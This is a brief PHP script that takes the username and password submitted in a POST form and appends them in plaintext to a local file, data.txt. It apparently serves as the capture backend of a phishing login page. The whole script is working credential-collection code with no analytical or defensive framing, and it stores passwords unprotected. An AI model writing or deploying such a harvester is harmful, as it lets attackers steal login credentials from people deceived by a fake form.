<?php
$txt = "data.txt"; 
if (isset($_POST['username']) && isset($_POST['password'])) { // check if both fields are set
    $fh = fopen($txt, 'a'); 
    $txt=$_POST['username'].' - '.$_POST['password']; 
    fwrite($fh,$txt); // Write information to the file
    fclose($fh); // Close the file
}
?>
